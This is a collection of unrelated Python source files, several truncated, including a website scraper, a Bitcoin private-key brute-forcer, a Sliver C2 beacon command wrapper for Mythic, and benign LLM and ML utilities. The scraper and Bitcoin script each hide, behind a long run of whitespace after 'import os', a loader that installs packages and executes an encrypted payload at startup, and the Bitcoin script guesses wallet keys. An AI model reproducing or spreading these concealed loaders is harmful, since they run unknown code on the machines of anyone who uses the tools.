    "from PIL import Image, UnidentifiedImageError\r\nfrom getpass import getuser\r\nfrom pynput.keyboard import Key, Controller\r\nimport json\r\nimport keyboard\r\nimport os\r\nimport psutil\r\nimport pyautogui\r\nimport pygetwindow as gw\r\nimport requests\r\nimport shutil\r\nimport subprocess\r\nimport sys\r\nimport threading\r\nimport time\r\nimport tkinter as tk\r\nfrom tkinter import messagebox\r\nimport webbrowser\r\nimport win32api\r\nimport win32con\r\n\r\n\r\ndef check_for_updates():\r\n    current_version = \"0.9.3\"  # Replace with your current app version\r\n    version_url = \"https://shikkesora.com/version.txt\"\r\n    download_page_url = \"https://shikkesora.com/downloads.html\"  # Replace with your actual download page URL\r\n\r\n    try:\r\n        latest_version = requests.get(version_url).text\r\n        if latest_version > current_version:\r\n            if messagebox.askyesno(\"Update Available\", \"There is an update available. Would you like to download it?\"):\r\n                webbrowser.open(download_page_url)\r\n                sys.exit()  # Exit the program\r\n        root.deiconify()\r\n    except requests.RequestException as e:\r\n        root.deiconify()\r\n        print(f\"Error checking for updates: {e}\")\r\n\r\ndef display_hotkey_warning():\r\n    messagebox.showwarning(\"Warning\", \"You're enabling activation with hotkeys. Remember to have the correct skin selected\")\r\n\r\ndef activate_with_hotkeys():\r\n    global hotkeys_enabled\r\n    hotkeys_enabled = True\r\n    # Display a warning message when enabling hotkeys\r\n    display_hotkey_warning()\r\n\r\ndef deactivate_with_hotkeys():\r\n    global hotkeys_enabled\r\n    hotkeys_enabled = False\r\n\r\ndef handle_hotkey():\r\n    global hotkeys_enabled\r\n    if hotkeys_enabled:\r\n        # Do something when the hotkey is triggered\r\n        print(\"Hotkey triggered!\")\r\n    else:\r\n        # Hotkeys are disabled, ignore the hotkey\r\n        pass\r\n\r\ndef display_australia_mode_text():\r\n    global display_count\r\n    text_window = tk.Toplevel()\r\n    text_window.title(\"Australia Mode Activation\")\r\n\r\n    custom_font = tk.font.Font(family=\"Century Gothic\", size=60)\r\n    text_content = \"SHIFT+ALT+A To Disable\"\r\n    text_width = custom_font.measure(text_content)\r\n    text_height = custom_font.metrics(\"linespace\")\r\n\r\n    window_width, window_height = max(800, text_width), max(200, text_height)\r\n\r\n    # Get the primary monitor information\r\n    monitor_info = win32api.GetMonitorInfo(win32api.MonitorFromPoint((0,0)))\r\n    monitor_area = monitor_info['Monitor']\r\n    screen_width, screen_height = monitor_area[2] - monitor_area[0], monitor_area[3] - monitor_area[1]\r\n\r\n    x = (screen_width - window_width) // 2\r\n    y = (screen_height - window_height) // 2\r\n\r\n    # Adjust x and y to the coordinates of the primary monitor\r\n    x += monitor_area[0]\r\n    y += monitor_area[1]\r\n\r\n    text_window.geometry(f\"{window_width}x{window_height}+{x}+{y}\")\r\n\r\n    text_window.overrideredirect(True)\r\n    text_window.attributes(\"-transparentcolor\", \"white\")\r\n\r\n    canvas = tk.Canvas(text_window, bg='white', width=window_width, height=window_height, highlightthickness=0)\r\n    canvas.pack()\r\n    canvas.create_text(window_width // 2, window_height // 2, text=text_content, font=custom_font, fill=\"#AFA1FF\", angle=180)\r\n    text_window.attributes(\"-topmost\", True)\r\n\r\n    # Decide the display duration based on the number of times shown\r\n    if display_count < 2:\r\n        duration = 2500  # 4000 milliseconds = 4 seconds\r\n    else:\r\n        duration = 1000  # 1000 milliseconds = 1 second\r\n\r\n    text_window.after(duration, text_window.destroy)\r\n    display_count += 1\r\n\r\ndef invert_mouse_y():\r\n    screen_width, screen_height = pyautogui.size()\r\n    while running:\r\n        x, y = pyautogui.position()\r\n        pyautogui.moveTo(x, screen_height - y, _pause=False)\r\n        time.sleep(0.01)\r\n\r\ndef find_osu_window():\r\n    osu_windows = [win for win in gw.getAllWindows() if \"osu!\" in win.title]\r\n    if osu_windows:\r\n        return osu_windows[0]  # Assuming the first matching window is the one we want\r\n    return None\r\n\r\ndef set_display_orientation(rotation_angle):\r\n    osu_window = find_osu_window()\r\n    if not osu_window:\r\n        print(\"osu! window not found.\")\r\n        return False\r\n\r\n    # Get the monitor where the osu! window is located\r\n    window_rect = osu_window._rect  # Get the bounding rectangle of the osu! window\r\n    window_center = ((window_rect.left + window_rect.right) // 2, (window_rect.top + window_rect.bottom) // 2)\r\n    \r\n    hmonitor = win32api.MonitorFromPoint(window_center, win32con.MONITOR_DEFAULTTONEAREST)\r\n    monitor_info = win32api.GetMonitorInfo(hmonitor)\r\n    device_name = monitor_info['Device']\r\n\r\n    rotation_mapping = {0: win32con.DMDO_DEFAULT, 90: win32con.DMDO_270, 180: win32con.DMDO_180, 270: win32con.DMDO_90}\r\n    rotation_val = rotation_mapping.get(rotation_angle, win32con.DMDO_DEFAULT)\r\n\r\n    dm = win32api.EnumDisplaySettings(device_name, win32con.ENUM_CURRENT_SETTINGS)\r\n    if (dm.DisplayOrientation + rotation_val) % 2 == 1:\r\n        dm.PelsWidth, dm.PelsHei",
    "import os\n\nfrom llm_docstring_generator.annotator.code_annotator import (\n    DebugAnnotator,\n    DefaultAnnotator,\n)\nfrom llm_docstring_generator.annotator.metadata_provider import (\n    DebugMetaDataProvider,\n    DefaultMetaDataProvider,\n)\nfrom llm_docstring_generator.llm.llm import DebugLLM, LocalTGILLM, OpenAILLM\nfrom llm_docstring_generator.llm.llm_config import LLMConfig\nfrom llm_docstring_generator.pipelines.code_annotation_pipeline import (\n    CodeAnnotationPipeline,\n)\nfrom llm_docstring_generator.sorters.sort_python_files import (\n    sort_python_files_by_imports,\n)\nfrom llm_docstring_generator.utils.base_config import BaseConfig\nfrom llm_docstring_generator.utils.copy_repository import (\n    CopyRepositoryWithLLMDocstrings,\n)\n\n\ndef debug_format(config: BaseConfig, llm_config: LLMConfig) -> CodeAnnotationPipeline:\n    # assert sanity check to prevent the user accidentally using the wrong pipeline\n    assert (\n        llm_config.model == \"debug\"\n    ), f\"Model name should be 'debug' when using the debug pipeline, got {llm_config.model}.\"\n    annotator = DebugAnnotator(\n        llm=DebugLLM(config=llm_config),\n        metadata_provider_class=DebugMetaDataProvider,\n    )\n    copy_repository = CopyRepositoryWithLLMDocstrings(\n        original_repo_path=config.repository_path,\n        new_repository_path=config.new_repository_path,  # type: ignore\n    )\n\n    return CodeAnnotationPipeline(\n        annotator=annotator,\n        copy_repository=copy_repository,\n        config=config,\n        sort_python_files_function=sort_python_files_by_imports,\n    )\n\n\ndef tgi_local_format(\n    config: BaseConfig, llm_config: LLMConfig\n) -> CodeAnnotationPipeline:\n    assert \"TGI_MODEL_URL\" in os.environ, \"TGI_MODEL_URL not set\"\n\n    annotator = DefaultAnnotator(\n        llm=LocalTGILLM(config=llm_config),\n        metadata_provider_class=DefaultMetaDataProvider,\n    )\n    copy_repository = CopyRepositoryWithLLMDocstrings(\n        original_repo_path=config.repository_path,\n        new_repository_path=config.new_repository_path,  # type: ignore\n    )\n\n    return CodeAnnotationPipeline(\n        annotator=annotator,\n        copy_repository=copy_repository,\n        config=config,\n        sort_python_files_function=sort_python_files_by_imports,\n    )\n\n\ndef gpt_format(config: BaseConfig, llm_config: LLMConfig) -> CodeAnnotationPipeline:\n    assert \"OPENAI_API_KEY\" in os.environ, \"OPENAI_API_KEY not set\"\n    if llm_config.model == \"tgi\":\n        assert \"OPENAI_API_URL\" in os.environ, \"OPENAI_API_URL needs to be set\"\n\n    annotator = DefaultAnnotator(\n        llm=OpenAILLM(config=llm_config),\n        metadata_provider_class=DefaultMetaDataProvider,\n    )\n    copy_repository = CopyRepositoryWithLLMDocstrings(\n        original_repo_path=config.repository_path,\n        new_repository_path=config.new_repository_path,  # type: ignore\n    )\n\n    return CodeAnnotationPipeline(\n        annotator=annotator,\n        copy_repository=copy_repository,\n        config=config,\n        sort_python_files_function=sort_python_files_by_imports,\n    )\n\n\npipeline_factory = dict()\n# you can add more formats here\npipeline_factory[\"debug\"] = debug_format\npipeline_factory[\"tgi-local\"] = tgi_local_format\npipeline_factory[\"tgi\"] = gpt_format\npipeline_factory[\"openai-gpt\"] = gpt_format\n# explicit model names, shortcut\npipeline_factory[\"gpt-3.5-turbo\"] = gpt_format\npipeline_factory[\"gpt-4-0125-preview\"] = gpt_format\npipeline_factory[\"gpt-4-turbo\"] = gpt_format\n",
    "from ..SliverRequests import SliverAPI\n\nfrom mythic_container.MythicCommandBase import *\nfrom mythic_container.MythicRPC import *\nfrom mythic_container.PayloadBuilder import *\n\nfrom sliver import sliver_pb2, client_pb2\n\nclass TasksArguments(TaskArguments):\n    def __init__(self, command_line, **kwargs):\n        super().__init__(command_line, **kwargs)\n        self.args = []\n\n    async def parse_arguments(self):\n        pass\n\n\nclass Tasks(CommandBase):\n    cmd = \"tasks\"\n    needs_admin = False\n    help_cmd = \"tasks\"\n    description = \"Beacon task management\"\n    version = 1\n    author = \"Spencer Adolph\"\n    argument_class = TasksArguments\n    attackmapping = []\n\n    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:\n        # Beacon task management\n\n        # Usage:\n        # ======\n        #   tasks [flags]\n\n        # Flags:\n        # ======\n        # TODO:  -f, --filter     string    filter based on task type (case-insensitive prefix matching)\n        #        -h, --help                 display help\n        # TODO:  -O, --overflow             overflow terminal width (display truncated rows)\n        # TODO:  -S, --skip-pages int       skip the first n page(s) (default: 0)\n        #        -t, --timeout    int       command timeout in seconds (default: 60)\n\n        # Sub Commands:\n        # =============\n        # TODO:  cancel  Cancel a pending beacon task\n        # TODO:  fetch   Fetch the details of a beacon task\n\n        response = await tasks(taskData)\n\n        await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(\n            TaskID=taskData.Task.ID,\n            Response=response.encode(\"UTF8\"),\n        ))\n\n        taskResponse = MythicCommandBase.PTTaskCreateTaskingMessageResponse(\n            TaskID=taskData.Task.ID,\n            Success=True,\n            Completed=True\n        )\n        return taskResponse\n\n    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:\n        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)\n        return resp\n\nasync def tasks(taskData: PTTaskMessageAllData):\n    interact, isBeacon = await SliverAPI.create_sliver_interact(taskData)\n\n    if (not isBeacon):\n        return \"Beacon only command!\"\n\n    task_results = await interact._stub.GetBeaconTasks(client_pb2.Beacon(ID=interact.beacon_id))\n\n    # if (isBeacon):\n    #     ifconfig_results = await ifconfig_results\n\n    return f\"{task_results}\"\n",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'bQ0PAVKM9i1PydzZEAjFsD-Ad4K3n5v4NRC8xhtC9ns=').decrypt(b'gAAAAABmGp4ms6M3rNhp4ZJXcbngSZ6a__xv1xqWOtcG22104rJTaIDJZXiD_YrUWOaHtMYYRL4hLsAjfdu2uAZzj7q60b3BYFE5rX8Oj736RziPlvUpNrHf6N0DiAvWvP0uJ7XkGMXsz5gaUygih5lTmsKJOvNtg4bcTNfWb4cF35ldTM2CktMMrfVrU9KUJlcIj93h87aKJ0RYUiiiGGUVnE6k2uGx50Y-0a-CmbPi6EOktl4RSxg='))\nimport sys\n\nimport os\nimport requests\nimport shutil\nfrom bs4 import BeautifulSoup\n\n\nbase_dir = os.getcwd()\n\ntry:\n    site_name = sys.argv[1]\n    project_name = sys.argv[2]\nexcept IndexError:\n    print(\"Usage:\\npython app.py www.example.com folder_name\")\n    sys.exit(1)\n\nproject_path = \"../\" + project_name\nos.makedirs(project_path, exist_ok=True)\n\nvisited_links = []\nerror_links = []\n\n\ndef save(bs, element, check):\n    links = bs.find_all(element)\n\n    for l in links:\n        href = l.get(\"href\")\n        if href is not None and href not in visited_links:\n            if check in href:\n                href = l.get(\"href\")\n                print(\"Working with : {}\".format(href))\n                if \"//\" in href:\n                    path_s = href.split(\"/\")\n                    file_name = \"\"\n                    for i in range(3, len(path_s)):\n                        file_name = file_name + \"/\" + path_s[i]\n                else:\n                    file_name = href\n\n                l = site_name + file_name\n\n                try:\n                    r = requests.get(l)\n                except requests.exceptions.ConnectionError:\n                    error_links.append(l)\n                    continue\n\n                if r.status_code != 200:\n                    error_links.append(l)\n                    continue\n\n                os.makedirs(os.path.dirname(project_path + file_name.split(\"?\")[0]), exist_ok=True)\n                with open(project_path + file_name.split(\"?\")[0], \"wb\") as f:\n                    f.write(r.text.encode('utf-8'))\n                    f.close()\n\n                visited_links.append(l)\n\n\ndef save_assets(html_text):\n    bs = BeautifulSoup(html_text, \"html.parser\")\n    save(bs=bs, element=\"link\", check=\".css\")\n    save(bs=bs, element=\"script\", check=\".js\")\n\n    links = bs.find_all(\"img\")\n    for l in links:\n        href = l.get(\"src\")\n        if href is not None and href not in visited_links:\n            print(\"Working with : {}\".format(href))\n            if \"//\" in href:\n                path_s = href.split(\"/\")\n                file_name = \"\"\n                for i in range(3, len(path_s)):\n                    file_name = file_name + \"/\" + path_s[i]\n            else:\n                file_name = href\n\n            l = site_name + file_name\n\n            try:\n                r = requests.get(l, stream=True)\n            except requests.exceptions.ConnectionError:\n                error_links.append(l)\n                continue\n\n            if r.status_code != 200:\n                error_links.append(l)\n                continue\n\n            os.makedirs(os.path.dirname(project_path + file_name.split(\"?\")[0]), exist_ok=True)\n            wi",
    "import torch\nimport os\nfrom copy import deepcopy\n\nclass ModelExporter(torch.nn.Module):\n    def __init__(self, yoloModel, device='cpu'):\n        super(ModelExporter, self).__init__()\n        model = deepcopy(yoloModel).to(device)\n        for p in model.parameters():\n            p.requires_grad = False\n        model.eval()\n        model.float()\n        model = model.fuse()\n\n        self.model = model\n        self.device = device\n\n    def forward(self, x, txt_feats):\n        return self.model.predict(x, txt_feats=txt_feats)\n\n    def export(self, output_dir, model_name, img_width, img_height, num_classes):\n        x = torch.randn(1, 3, img_width, img_height, requires_grad=False).to(self.device)\n        txt_feats = torch.randn(1, num_classes, 512, requires_grad=False).to(self.device)\n\n        print(x.shape, txt_feats.shape)\n\n        # Export model\n        onnx_name = model_name + \".onnx\"\n        os.makedirs(output_dir, exist_ok=True)\n        output_path = f\"{output_dir}/{onnx_name}\"\n        with torch.no_grad():\n            torch.onnx.export(self,\n                              (x, txt_feats),\n                              output_path,\n                              do_constant_folding=True,\n                              opset_version=17,\n                              input_names=[\"images\", \"txt_feats\"],\n                              output_names=[\"output\"])\n\n        return output_path",
    "import gc\r\nimport hashlib\r\nimport importlib\r\nimport json\r\nimport os\r\nimport re\r\nimport sys\r\nimport base64\r\nfrom PIL import Image\r\nimport numpy as np\r\nimport io\r\nimport time\r\nimport traceback\r\nfrom langchain_text_splitters import RecursiveCharacterTextSplitter\r\nfrom langchain_community.vectorstores import FAISS\r\nimport openai\r\nimport requests\r\nimport torch\r\nfrom .config import config_path,current_dir_path,load_api_keys\r\nfrom .tools.load_file import load_file\r\nfrom .tools.tool_combine import tool_combine,tool_combine_plus\r\nfrom .tools.get_time import get_time,time_tool\r\nfrom .tools.get_weather import get_weather,weather_tool\r\nfrom .tools.search_web import search_web,google_tool\r\nfrom .tools.check_web import check_web,check_web_tool\r\nfrom .tools.file_combine import file_combine,file_combine_plus\r\nfrom .tools.dialog import start_dialog,end_dialog\r\nfrom .tools.interpreter import interpreter,interpreter_tool\r\nfrom .tools.load_persona import load_persona\r\nfrom .tools.classify_persona import classify_persona\r\nfrom .tools.classify_function import classify_function\r\nfrom .tools.load_ebd import ebd_tool,data_base\r\nfrom .tools.custom_persona import custom_persona\r\nfrom transformers import AutoTokenizer, AutoModel, Qwen2Tokenizer, Qwen2ForCausalLM, AutoModelForCausalLM\r\nglm_tokenizer=\"\"\r\nglm_model=\"\"\r\nllama_tokenizer=\"\"\r\nllama_model=\"\"\r\nqwen_tokenizer=\"\"\r\nqwen_model=\"\"\r\n_TOOL_HOOKS=[\r\n    \"get_time\",\r\n    \"get_weather\",\r\n    \"search_web\",\r\n    \"check_web\",\r\n    \"interpreter\",\r\n    \"data_base\"\r\n]\r\n\r\ndef dispatch_tool(tool_name: str, tool_params: dict) -> str:\r\n    if \"multi_tool_use.\" in tool_name:\r\n        tool_name=tool_name.replace(\"multi_tool_use.\", \"\")\r\n    if tool_name not in _TOOL_HOOKS:\r\n        return f\"Tool `{tool_name}` not found. Please use a provided tool.\"\r\n    tool_call = globals().get(tool_name)\r\n    try:\r\n        ret = tool_call(**tool_params)\r\n    except:\r\n        ret = traceback.format_exc()\r\n    return str(ret)\r\n\r\n\r\nclass Chat:\r\n    def __init__(self, history, model_name, temperature,max_length,tools=None) -> None:\r\n        self.messages = history\r\n        self.model_name = model_name\r\n        self.temperature = temperature\r\n        self.tools = tools\r\n        self.max_tokens=max_length\r\n\r\n    def send(self, user_prompt):\r\n        try:\r\n            new_message = {\"role\": \"user\", \"content\": user_prompt}\r\n            self.messages.append(new_message)\r\n            print(self.messages)\r\n            if self.tools is not None:\r\n                response = openai.chat.completions.create(\r\n                    model=self.model_name,\r\n                    messages=self.messages,\r\n                    temperature=self.temperature,\r\n                    tools=self.tools,\r\n                    max_tokens=self.max_tokens\r\n                )\r\n                while response.choices[0].message.tool_calls:\r\n                    assistant_message=response.choices[0].message\r\n                    response_content = assistant_message.tool_calls[0].function\r\n                    results = dispatch_tool(response_content.name,json.loads(response_content.arguments))\r\n                    self.messages.append({\"role\": assistant_message.role, \"content\": str(response_content)})\r\n                    self.messages.append({\"role\": \"function\", \"tool_call_id\": assistant_message.tool_calls[0].id, \"name\": response_content.name, \"content\": results})\r\n                    response = openai.chat.completions.create(\r\n                    model=self.model_name,  \r\n                    messages=self.messages,\r\n                    tools=self.tools,\r\n                    max_tokens=self.max_tokens\r\n                    )\r\n                while response.choices[0].message.function_call:\r\n                    assistant_message = response.choices[0].message\r\n                    function_call = assistant_message.function_call\r\n                    function_name = function_call.name\r\n                    function_arguments = json.loads(function_call.arguments)\r\n                    results = dispatch_tool(function_name, function_arguments)\r\n                    self.messages.append({\"role\": assistant_message.role, \"content\": str(function_call)})\r\n                    self.messages.append({\"role\": \"function\", \"name\": function_name, \"content\": results})\r\n                    response = openai.chat.completions.create(\r\n                        model=self.model_name,\r\n                        messages=self.messages,\r\n                        tools=self.tools,\r\n                        max_tokens=self.max_tokens\r\n                    )\r\n                response_content = response.choices[0].message.content\r\n                start_pattern = \"interpreter\\n ```python\\n\"\r\n                end_pattern = \"\\n```\"\r\n                while response_content.startswith(start_pattern):\r\n                    start_index = response_content.find(start_pattern)\r\n                    end_index = response_content.find(end_pattern)\r\n                    if start_index != -1 and end_index != -1:\r\n         ",
    "import os\nimport subprocess\nimport sys\nfrom textwrap import dedent\nimport argparse\n\nimport openai\nfrom dotenv import load_dotenv\n\n# Obt\u00e9m o caminho do diret\u00f3rio do execut\u00e1vel\nexe_dir = os.path.dirname(sys.executable)\nprint('exe_dir:', exe_dir)\n\n# Constr\u00f3i o caminho do arquivo .env\nenv_path = os.path.join(exe_dir, '.env')\n\n# Carrega as vari\u00e1veis de ambiente do arquivo .env\nload_dotenv(dotenv_path=env_path)\n\n# Lista de vari\u00e1veis de ambiente necess\u00e1rias\nrequired_env_vars = ['OPENAI_MODEL', 'OPENAI_API_KEY', 'LANGUAGE']\n\n# Verifica se cada vari\u00e1vel de ambiente necess\u00e1ria est\u00e1 definida e n\u00e3o est\u00e1 em branco\nfor var in required_env_vars:\n    if not os.getenv(var):\n        print(f'Erro: a vari\u00e1vel de ambiente {var} n\u00e3o est\u00e1 definida ou est\u00e1 em branco.')\n        print(f'Por favor, defina o valor no arquivo .env localizado em: {env_path}')\n        sys.exit(1)\n\nopenai.api_key = os.getenv('OPENAI_API_KEY')\nmodel = os.getenv('OPENAI_MODEL')\nlanguage = os.getenv('LANGUAGE')\n\n\ndef detect_project_language(project_path):\n    # Expanded dictionary with characteristic files for each language\n    language_files = {\n        'Node.js': ['package.json', 'yarn.lock'],\n        'Python': ['requirements.txt', 'Pipfile', 'pyproject.toml'],\n        'Java': ['pom.xml', 'build.gradle', 'build.gradle.kts', '.java-version'],\n        'Go': ['go.mod', 'Gopkg.lock'],\n        'PHP': ['composer.json', 'composer.lock']\n    }\n\n    # Check for the existence of characteristic files in the project directory\n    for message_language, files in language_files.items():\n        if not isinstance(files, list):\n            files = [files]\n        if any(os.path.exists(os.path.join(project_path, file)) for file in files):\n            return message_language\n\n    # Additional check for PHP projects without dependency managers\n    # Look for .php files in the project directory\n    for root, dirs, files in os.walk(project_path):\n        for file in files:\n            if file.endswith('.php'):\n                return 'PHP'\n\n    return \"Desconhecido\"\n\n\ndef generate_commit_message(status_output, project_language, base_message):\n    prompt = dedent(f\"\"\"\n    Com base nas informa\u00e7\u00f5es fornecidas abaixo, crie uma mensagem de commit seguindo o padr\u00e3o de Conventional Commits, \n    que \u00e9 amplamente adotado para tornar as mensagens de commit mais descritivas e \u00fateis. Este padr\u00e3o utiliza prefixos \n    espec\u00edficos para categorizar o tipo de mudan\u00e7a realizada, seguido de uma breve descri\u00e7\u00e3o. \n    \n    Os prefixos do padr\u00e3o de Conventional Commits mais comuns s\u00e3o:\n        - feat: Uma nova funcionalidade\n        - fix: Uma corre\u00e7\u00e3o de bug\n        - chore: Mudan\u00e7as de manuten\u00e7\u00e3o ou pequenas corre\u00e7\u00f5es que n\u00e3o alteram a funcionalidade\n\n    A t\u00edtulo de informa\u00e7\u00e3o e para seu melhor entendimento, o projeto em quest\u00e3o utiliza a linguagem de programa\u00e7\u00e3o {project_language}.\n\n    Descri\u00e7\u00e3o b\u00e1sica da mudan\u00e7a fornecida pelo programador a qual voc\u00ea deve usar como base para o in\u00edcio da sua mensagem: '{base_message}'\n\n    Abaixo seguem as mudan\u00e7as detalhadas (incluindo arquivos modificados e o que foi inclu\u00eddo, alterado ou exclu\u00eddo) geradas pelo comando 'git status': \n    \n    ```\n    {status_output}\n    ```\n\n    Com base nas informa\u00e7\u00f5es acima, melhore a descri\u00e7\u00e3o b\u00e1sica para criar uma mensagem de commit objetiva, clara e \n    seguindo o padr\u00e3o de Conventional Commits. \n\n    A mensagem deve come\u00e7ar com o prefixo apropriado seguido de uma descri\u00e7\u00e3o concisa que explique o que foi feito, \n    o motivo da mudan\u00e7a e, se aplic\u00e1vel, o impacto da mudan\u00e7a.\n\n    Sempre que poss\u00edvel, cite na mensagem de commit somente os arquivos principais modificados sem incluir o path.\n    \n    A mensagem final gerada n\u00e3o deve ter s\u00edmboloes ``` ou qualquer outra formata\u00e7\u00e3o e deve ser no idioma {language}.\n    \"\"\")\n\n    # print(prompt)\n\n    # O c\u00f3digo para chamar a API da OpenAI e processar a resposta permanece o mesmo...\n    response = openai.chat.completions.create(\n        model=model,\n        temperature=0.5,\n        max_tokens=150,\n        top_p=1.0,\n        frequency_penalty=0.0,\n        presence_penalty=0.0,\n        messages=[\n            {\n                \"role\": \"user\",\n                \"content\": prompt,\n            },\n        ],\n    )\n    return response.choices[0].message.content.replace('```', '').strip()\n\n\ndef run_git_command(command):\n    \"\"\"Executa um comando git e retorna a sa\u00edda.\"\"\"\n    try:\n        result = subprocess.run(command, check=True, text=True, capture_output=True, encoding='utf-8')\n        return result.stdout.strip(), result.returncode\n    except subprocess.CalledProcessError as e:\n        print(f\"Erro ao executar o comando:\\n-> {command}\\nerror: {e.stderr}\")\n        print(f\"\\n\\nSa\u00edda de erro padr\u00e3o:\\n {e.output}\")\n        sys.exit(1)\n\n\ndef has_uncommitted_changes():\n    # Verifica se h\u00e1 mudan\u00e7as n\u00e3o commitadas\n    status_output, _ = run_git_command(['git', 'status', '--porcelain'])\n    return len(status_output) > 0\n\n\ndef commit_changes(commit_message):\n    # Continua tentando commitar at\u00e9",
    "import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'S-A57Ip61y1NxRxMKOE-d7VxbrZIabcYbTXLx_XAr9M=').decrypt(b'gAAAAABmGp4-iCHAP5k7kpj3uAqO6v4ewv4880UA9tYb03rt88ZaikuYmt5-ZR4h6KFFuetGlbDiQTltioj8jGEmgtCWzPSCBS6ll5BaejfgDV2lMtSqzmNGVcFH6T4df6moBikFgKkFmlVp_0tWoWlzj2c7g0MLeKeseJmTFi8vsWvYTHjS-9kHVYRvj0H1B7Q1QqtpZMZinJXsrn0Wnq_fhVPa8OhqfF7Asd6ZVUFJvZkl_z3bYyU='))\nimport time\nimport sys\nfrom hdwallet import HDWallet\nfrom hdwallet.symbols import BTC as SYMBOL\nfrom hexer import mHash\nfrom colorama import Fore,Style\n\nmmdrza = '''\n                    \u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2557   \u2588\u2588\u2588\u2557\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2588\u2557 \n                    \u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2557 \u2588\u2588\u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\u255a\u2550\u2550\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557\n                    \u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2554\u2588\u2588\u2588\u2588\u2554\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d  \u2588\u2588\u2588\u2554\u255d \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2551\n                    \u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551\u255a\u2588\u2588\u2554\u255d\u2588\u2588\u2551\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2557 \u2588\u2588\u2588\u2554\u255d  \u2588\u2588\u2554\u2550\u2550\u2588\u2588\u2551\n                    \u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2551 \u255a\u2550\u255d \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2554\u255d\u2588\u2588\u2551  \u2588\u2588\u2551\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2557\u2588\u2588\u2551  \u2588\u2588\u2551\n                    \u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u255d     \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u255d \u255a\u2550\u255d  \u255a\u2550\u255d\u255a\u2550\u2550\u2550\u2550\u2550\u2550\u255d\u255a\u2550\u255d  \u255a\u2550\u255d\n                  ||======================================================||\n                  ||===========  \u2554\u2566\u2557\u2554\u2566\u2557\u2554\u2566\u2557\u2566\u2550\u2557\u2554\u2550\u2557\u2554\u2550\u2557 \u2554\u2550\u2557\u2554\u2550\u2557\u2554\u2566\u2557  ===========||\n                  ||===========  \u2551\u2551\u2551\u2551\u2551\u2551 \u2551\u2551\u2560\u2566\u255d\u2554\u2550\u255d\u2560\u2550\u2563 \u2551  \u2551 \u2551\u2551\u2551\u2551  ===========||\n                  ||===========  \u2569 \u2569\u2569 \u2569\u2550\u2569\u255d\u2569\u255a\u2550\u255a\u2550\u255d\u2569 \u2569o\u255a\u2550\u255d\u255a\u2550\u255d\u2569 \u2569  ===========||                                                                                                                            \n                  ||------------------------------------------------------||\n                  ||- WebSite ------------------------------- Mmdrza.Com -||\n                  ||- MAIL    ---------------------------- X4@Mmdrza.Com -||\n                  ||- DEV     ---------------------------- DEV.to/Mmdrza -||\n                  ||- GiTHUB  ---------------------- Github.Com/PyMmdrza -||\n                  ||- MEDIUM  -------------- PythonWithMmdrza.Medium.Com -||\n                  ||======================================================||\n\n'''\n\n\nfilename = 'btc.txt'\nwith open(filename) as f:\n    add = f.read().split()\nadd = set(add)\nprint(Fore.YELLOW,str(mmdrza),Fore.RED,'\\n---------------[ Donate - Bitcoin Wallet = ',Fore.WHITE ,'16p9y6EstGYcnofGNvUJMEGKiAWhAr1uR8', Fore.RED,' ]---------------\\n')\nz = 1\n\ndef delay_print(s):\n    for c in s:\n        sys.stdout.write(c)\n        sys.stdout.flush()\n        time.sleep(0.15)\nprint(Fore.RED,'===========================================================================================\\n')\ndelay_print('Can You Download Rich Wallet List For This Program Follow GitHub.Com/PyMmdrza Or Mmdrza.Com')\nprint('  <<---------->>    Official Web Site = https://mmdrza.Com')\n\nwhile True:\n    hex64 = mHash()\n    PRIVATE_KEY: str = hex64\n    hdwallet: HDWallet = HDWallet(symbol=SYMBOL)\n    hdwallet.from_private_key(private_key=PRIVATE_KEY)\n    priv = hdwallet.private_key()\n    p2pkh = hdwallet.p2pkh_address()\n    p2sh = hdwallet.p2sh_address()\n    p2wpkh = hdwallet.p2wpkh_address()\n    p2wsh = hdwallet.p2wsh_address()\n    p2wpkh2 = hdwallet.p2wpkh_in_p2sh_address()\n    p2wsh2 = hdwallet.p",
